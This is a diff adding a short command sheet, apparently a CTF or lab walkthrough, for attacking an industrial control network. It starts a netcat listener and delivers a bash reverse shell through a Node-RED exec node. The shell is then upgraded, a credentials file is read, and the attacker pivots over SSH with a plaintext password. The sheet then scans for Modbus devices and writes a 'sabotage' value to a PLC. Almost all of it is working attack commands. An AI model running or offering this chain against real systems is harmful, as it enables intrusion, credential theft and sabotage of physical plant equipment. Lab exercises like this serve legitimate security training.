@@ -1,0 +1,26 @@
+# Attacker Terminal (Kali) - Tab 1 (Start listener)
+nc -nlvp 4444
+
+# Node-RED Exec Node Command (Deploy and trigger to connect shell)
+bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
+
+# Caught Netcat Shell (Run immediately to upgrade terminal)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Upgraded Shell (Read engineering credentials)
+cat /home/debian/ews_credentials.txt
+
+# Upgraded Shell (Pivot to EWS)
+ssh operator@192.168.20.20
+
+# EWS Password (Copy and paste into SSH prompt)
+operator123
+
+# pivoted EWS Shell (Scan control subnet for Modbus devices)
+nmap -p 502 --open 192.168.20.0/24
+
+# Pivoted EWS Shell (Execute Modbus sabotage on PLC)
+modbus 192.168.20.10 0=0
+
+# Pivoted EWS Shell (Display final safety override flag)
+cat /var/log/safety_override.txt
